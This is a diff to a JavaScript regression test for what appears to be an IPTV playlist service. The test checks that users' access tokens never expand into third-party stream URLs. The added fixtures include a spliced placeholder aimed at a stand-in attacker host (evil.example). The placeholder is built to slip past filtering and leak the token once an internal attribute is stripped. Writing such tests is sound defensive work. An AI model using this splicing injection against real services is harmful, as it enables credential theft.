@@ -12,7 +12,9 @@
  *  - 先丢弃再去重：带占位符的条目排在前面时，同名同地址的干净条目不能被当成重复删掉；
  *  - opts 里带占位符的那条拒收；
  *  - 端到端：订阅 → 保存 → 重新生成 → 对外输出（m3u / txt、带配置档与否），第三方地址里
- *    不出现访问令牌；本项目自己的占位地址照常展开。
+ *    不出现访问令牌；本项目自己的占位地址照常展开；
+ *  - 拼接：第三方地址行 / #EXTVLCOPT 里写 `${re source-ids="x"place}`，输出时剥离内部属性
+ *    不能把它拼成占位符再展开（interfaceStr 先展开、后剥离）。
  *
  * 运行： node scripts/test-replace-token.mjs   （或 npm test）
  */
@@ -104,6 +106,12 @@ try {
     'http://cdn.example/dup.m3u8',
     '#EXTINF:-1 tvg-logo="http://cdn.example/dup.png" group-title="外部",重复台',
     'http://cdn.example/dup.m3u8',
+    // 不含字面量占位符、汇总时拦不住的拼接写法：剥掉中间的 source-ids 正好拼出 ${replace}
+    '#EXTINF:-1 group-title="外部",拼接地址台',
+    'http://evil.example/splice.m3u8?k=${re source-ids="x"place}',
+    '#EXTINF:-1 group-title="外部",拼接请求头台',
+    '#EXTVLCOPT:http-referrer=http://evil.example/?k=${re source-ids="x"place}',
+    'http://cdn.example/splice-opt.m3u8',
   ].join('\n')
 
   await check('端到端：保存订阅后重新生成，interface.txt 里第三方内容不带占位符', async () => {
@@ -134,8 +142,9 @@ try {
     for (const path of ['/m3u', '/txt']) {
       await check(`对外输出（${profile} 档 ${path}）：访问令牌不进任何第三方地址，本项目占位地址照常展开`, () => {
         const out = String(interfaceStr(path, { host: 'localhost:1905' }, '', '', profile, '/u/SECRET-TOKEN', '').content)
-        assert.ok(!out.includes(T), '占位符应全部展开')
         assert.ok(!/(evil|cdn)\.example[^\n]*SECRET-TOKEN/.test(out), out)
+        // 拼接写法剥离后会剩下一个没展开的字面量占位符，只会出现在第三方的垃圾地址里，不带凭据
+        for (const line of out.split('\n').filter(hasReplaceToken)) assert.ok(line.includes('evil.example'), line)
         assert.ok(out.includes('http://cdn.example/ok.m3u8'))
         if (path === '/m3u') assert.ok(out.includes('x-tvg-url="http://localhost:1905/u/SECRET-TOKEN/playback.xml"'))
       })
